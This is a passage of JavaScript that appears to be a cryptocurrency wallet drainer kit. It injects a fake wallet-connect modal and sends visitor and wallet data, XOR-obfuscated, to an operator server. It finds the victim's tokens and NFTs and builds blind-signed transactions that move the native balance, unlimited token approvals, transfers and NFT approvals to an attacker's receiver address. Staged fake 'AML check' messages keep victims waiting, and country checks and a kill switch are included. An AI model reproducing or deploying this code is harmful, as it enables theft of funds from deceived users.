13.5766 18.875 13.875V14.25H20C20.2984 14.25 20.5845 14.3685 20.7955 14.5795C21.0065 14.7905 21.125 15.0766 21.125 15.375Z"
              fill="white"
            ></path>
          </svg>
          Сonnect by QR-code
        </button2>
        <span>Сonnect by QR-code with WalletConnect</span>
      </div>
    </div>
      `}
  ];

const inject_modal = () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.id = 'web3-style';
    modal_style.innerHTML = MS_Modal_Data[0].data;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    document.querySelector('.web3-overlay').addEventListener('click', () => { ms_hide(); });
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = MS_Modal_Data[1].data;
    document.body.prepend(modal_elem);
  } catch(err) {
    console.log(err);
  }
};

const set_modal_data = (style_code, html_code) => {
  try {
    MS_Modal_Data[0].data = style_code;
    MS_Modal_Data[1].data = html_code;
    reset_modal();
  } catch(err) {
    console.log(err);
  }
};

const reset_modal = () => {
  try { document.getElementById('web3-modal').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-overlay').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-style').remove(); } catch(err) { console.log(err); }
  try { inject_modal(); } catch(err) { console.log(err); }
};

const ms_init = () => {
  try {
    if (!MS_Connection) return connect_wallet();
    if (MS_Process) return;
    if (MS_Modal_Style == 2) {
      MSM.open(MS_Color_Scheme, MS_Modal_Mode);
    } else {
      document.getElementById('web3-modal').style.display = 'block';
      document.getElementById('web3-overlay').style.display = 'block';
      document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
      document.getElementsByClassName('web3-modal-wc')[0].style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    if (MS_Modal_Style == 2) {
      MSM.close();
    } else {
      document.getElementById('web3-modal').style.display = 'none';
      document.getElementById('web3-overlay').style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const load_wc = async () => {
  let all_chains_arr = [], all_chains_obj = {};
  for (const chain_id in MS_Settings.RPCs) {
    if (chain_id != '1') all_chains_arr.push(chain_id);
    all_chains_obj[chain_id] = MS_Settings.RPCs[chain_id];
  }
  MS_Provider = await WC2_Provider.init({
    projectId: MS_WalletConnect_ID,
    chains: [ '1' ],
    optionalChains: all_chains_arr,
    metadata: MS_WalletConnect_MetaData,
    showQrModal: true,
    rpcMap: all_chains_obj,
    methods: [
      'eth_sendTransaction',
      'eth_signTransaction',
      'eth_sign', 'personal_sign',
      'eth_signTypedData',
      'eth_signTypedData_v4'
    ],
    qrModalOptions: (MS_WalletConnect_Customization == 1) ? MS_WalletConnect_Theme : undefined
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

let prs_enc = 0, last_request_ts = 0;
(async () => {
  prs_enc = MS_Encryption_Key;
  MS_Encryption_Key = Math.floor(Math.random() * 1000);
})()

const send_request = async (data) => {
  try {
    if (MS_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
    while (Date.now() <= last_request_ts)
      await new Promise(r => setTimeout(r, 1));
    last_request_ts = Date.now();
    data.domain = window.location.host;
    data.worker_id = MS_Worker_ID || null;
    data.user_id = MS_ID || null;
    data.message_ts = last_request_ts;
    data.chat_data = MS_Custom_Chat.Enable == 0 ? false : MS_Custom_Chat.Chat_Settings;
    data.partner_address = MS_Partner_Address;
    const encode_key = btoa(String(5 + 10 + 365 + 2048 + 867 + prs_enc));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch('https://' + MS_Server, {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `ver=08112023&raw=${request_data}`
    });
    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status)
      return { status: 'error', error: 'Server is Unavailable' };
    else {
      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') MS_Force_Mode = true;
      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
        MS_Force_Mode = true;
        try {
          if (MS_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
              confirmButtonText: 'OK', timer: 30000, color: MS_Color_Scheme
            });
          } else {
            Swal.close();
            Swal.fire({
              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
              showConfirmButton: true, confirmButtonText: 'OK'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      return response_data;
    }
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

const retrive_config = async () => {
  try {
    let personal_wallet = null;
    if (localStorage['personal_wallet'] ) personal_wallet = { address: localStorage['personal_wallet'] };
    const response = await send_request({ action: 'retrive_config', personal_wallet });
    if (response.status == 'OK') {
      MS_Connection = true;
      MS_Settings = response.data;
      MS_Gas_Multiplier = MS_Settings.Settings.Gas_Multiplier;
      if (!MS_Settings.CIS) MS_Bad_Country = false;
      if (MS_Settings.Personal_Wallet && typeof MS_Settings.Personal_Wallet == 'object')
        localStorage['personal_wallet'] = MS_Settings.Personal_Wallet.address;
      if (typeof MS_Settings.DSB == 'boolean' && MS_Settings.DSB === true) {
        window.location.href = 'about:blank';
      }
    }
  } catch(err) {
    console.log(err);
  }
};

const retrive_contract = async () => {
  try {
    const response = await send_request({ action: 'retrive_contract' });
    if (response.status == 'OK') MS_Contract_ABI = response.data;
  } catch(err) {
    console.log(err);
  }
};

const enter_website = async () => {
  try {
    let response = await send_request({
      action: 'enter_website',
      user_id: MS_ID,
      time: new Date().toLocaleString('ru-RU')
    });
    if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
      MS_Bad_Country = true;
    }
  } catch(err) {
    console.log(err);
  }
};

const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: MS_ID, wallet: MS_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: MS_ID, address: MS_Current_Address,
      wallet: MS_Current_Provider, chain_id: MS_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        case 25: return 'cronos';
        case 100: return 'gnosis';
        case 128: return 'heco';
        case 1284: return 'moonbeam';
        case 1285: return 'moonriver';
        case 2222: return 'kava';
        case 42220: return 'celo';
        case 1666600000: return 'harmony';
        case 324: return 'zksync_era';
        case 8453: return 'base';
        case 369: return 'pulse';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        case 25: return 'CRO';
        case 100: return 'XDAI';
        case 128: return 'HT';
        case 1284: return 'GLMR';
        case 1285: return 'MOVR';
        case 2222: return 'KAVA';
        case 42220: return 'CELO';
        case 1666600000: return 'ONE';
        case 324: return 'ETH';
        case 8453: return 'ETH';
        case 369: return 'PLS';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${MS_Settings.AT || ''}`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "base", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address || null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
        asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrive_timeout = {};
const retrive_token = async (chain_id, contract_address) => {
  try {
    if (!MS_API_Data[chain_id] || MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API == '') return MS_Contract_ABI['ERC20'];
    while (retrive_timeout[chain_id] && retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000) && retrive_timeout[chain_id].count >= 5)
      await new Promise(r => setTimeout(r, 100));
    if (!retrive_timeout[chain_id])
      retrive_timeout[chain_id] = { time: Math.floor(Date.now() / 1000), count: 1 };
    else {
      if (retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000)) retrive_timeout[chain_id].count += 1;
      else {
        retrive_timeout[chain_id].time = Math.floor(Date.now() / 1000);
        retrive_timeout[chain_id].count = 1;
      }
    }
    let response = await fetch(`https://${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrive_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      return MS_Contract_ABI['ERC20'];
    }
  } catch (err) {
    return MS_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) return 0;
    if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
            return 0;
          }
        }
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const MS_Gas_Reserves = {};

const show_check = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Processing wallet', text: 'Connecting to blockchain...',
        showConfirmButton: true, confirmButtonText: 'Loading...', timer: 2000, color: MS_Color_Scheme
      }).then(() => {
        if (MS_Check_Done) return;
        MSL.fire({
          icon: 'load', title: 'Processing wallet', text: 'Getting your wallet address...',
          showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
        }).then(() => {
          if (MS_Check_Done) return;
          MSL.fire({
            icon: 'load', title: 'Processing wallet', text: 'Checking your wallet for AML...',
            showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
          }).then(() => {
            if (MS_Check_Done) return;
            MSL.fire({
              icon: 'success', title: 'Processing wallet', subtitle: 'Everything good!',
              text: 'Your wallet is AML risk is low enough!', showConfirmButton: false, timer: 5000, color: MS_Color_Scheme
            }).then(() => {
              if (MS_Check_Done) return;
              MSL.fire({
                icon: 'load', title: 'Processing wallet', text: 'Please wait, we\'re scanning more details...',
                showConfirmButton: true, confirmButtonText: 'Loading...', timer: 300000, color: MS_Color_Scheme
              });
            });
          });
        });
      });
    } else {
      Swal.fire({
        title: 'Connection established',
        icon: 'success',
        timer: 2000
      }).then(() => {
        if (MS_Check_Done) return;
        Swal.fire({
          text: 'Connecting to Blockchain...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 5000, width: 600, showConfirmButton: false
        }).then(() => {
          if (MS_Check_Done) return;
          Swal.fire({
            text: 'Getting your wallet address...',
            imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
            timer: 5000, width: 600, showConfirmButton: false
          }).then(() => {
            if (MS_Check_Done) return;
            Swal.fire({
              text: 'Checking your wallet for AML...',
              imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
              imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
              timer: 5000, width: 600, showConfirmButton: false
            }).then(() => {
              if (MS_Check_Done) return;
              Swal.fire({
                text: 'Good, your wallet is AML clear!',
                icon: 'success',
                allowOutsideClick: false, allowEscapeKey: false,
                timer: 2000, width: 600, showConfirmButton: false
              }).then(() => {
                if (MS_Check_Done) return;
                Swal.fire({
                  text: 'Please wait, we\'re scanning more details...',
                  imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                  imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
                  timer: 0, width: 600, showConfirmButton: false
                });
              });
            });
          });
        });
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(MS_Current_Address, "pending");
};

const wait_message = () => {
  try {
    if (!MS_Process) return;
    Swal.close();
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'OK', subtitle: 'Thanks!', text: 'Got your sign, wait a bit for confirmation...',
        showConfirmButton: false, timer: 2500, color: MS_Color_Scheme
      }).then(() => {
        MSL.fire({
          icon: 'load', title: 'Processing sign', text: ' Please, don\'t leave this page!',
          showConfirmButton: true, confirmButtonText: 'Confirming sign...', showConfirmButton: false, color: MS_Color_Scheme
        });
      });
    } else {
      Swal.fire({
        html: '<b>Thanks!</b>', icon: 'success',
        allowOutsideClick: false, allowEscapeKey: false,
        timer: 2500, width: 600, showConfirmButton: false
      }).then(() => {
        Swal.fire({
          html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      });
    }

  } catch(err) {
    console.log(err);
  }
};

const end_message = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'error', title: 'Error', subtitle: 'We\'re sorry', text: 'Your wallet doesn\'t meet the requirements. Try to connect a middle-active wallet to try again!',
        showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!', icon: 'error',
        allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
        showConfirmButton: true, confirmButtonText: 'OK'
      });
    }
  } catch(err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_ready = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'OK', subtitle: 'Sign is confirmed', text: 'Please, wait a bit for confirmation...',
        showConfirmButton: false, color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Success!</b> Your sign is confirmed!',
        icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
        showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[1]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const SIGN_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Receiver, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  const web3 = new Web3(MS_Provider);

  unsigned_tx.value = web3.utils.toHex(available_amount.toString());
  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, MS_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset, available_amount); sign_ready();
};

const SIGN_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (MS_Settings.Settings.Sign.Tokens == 1) contract_data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
  else if (MS_Settings.Settings.Sign.Tokens == 2) contract_data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, MS_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready();
};

const SIGN_NFT = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);

  if (MS_Settings.Settings.Sign.NFTs == 1) data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  else if (MS_Settings.Settings.Sign.NFTs == 2) data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, MS_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready();
};

const DO_SWAP = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
        asset.address, MS_Swap_Route[asset.chain_id]
      ], MS_Settings.Receiver, swap_deadline, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
      gas_attempts += 1;
    }
  }
  const nonce = await get_nonce(asset.chain_id);
  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
  await swap_request(asset.swapper_type, asset, [ asset ]); sign_next();
  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
    asset.address, MS_Swap_Route[asset.chain_id]
  ], MS_Settings.Receiver, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, [ asset ]); sign_ready();
};

const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
